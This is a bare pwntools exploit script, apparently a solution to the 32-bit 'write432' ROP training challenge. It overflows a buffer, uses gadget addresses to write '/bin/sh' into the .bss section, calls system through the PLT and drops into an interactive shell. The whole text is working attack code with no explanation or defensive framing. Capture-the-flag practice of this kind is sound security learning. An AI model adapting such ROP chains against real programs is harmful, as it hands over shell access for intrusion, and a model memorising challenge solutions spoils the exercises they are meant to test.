from pwn import *

#context.log_level = 'debug'
p = process("./write432")

bss_addr = 0x0804a028
sys_plt = 0x08048430
mov_edip_ebp = 0x08048670
pop_edi_ebp = 0x080486da

payload = ''
payload += "A"*44

payload += p32(pop_edi_ebp)
payload += p32(bss_addr)
payload += "/bin"
payload += p32(mov_edip_ebp)

payload += p32(pop_edi_ebp)
payload += p32(bss_addr+4)
payload += "/sh\x00"
payload += p32(mov_edip_ebp)

payload += p32(sys_plt)
payload += "BBBB"
payload += p32(bss_addr)


p.sendline(payload)
p.interactive()
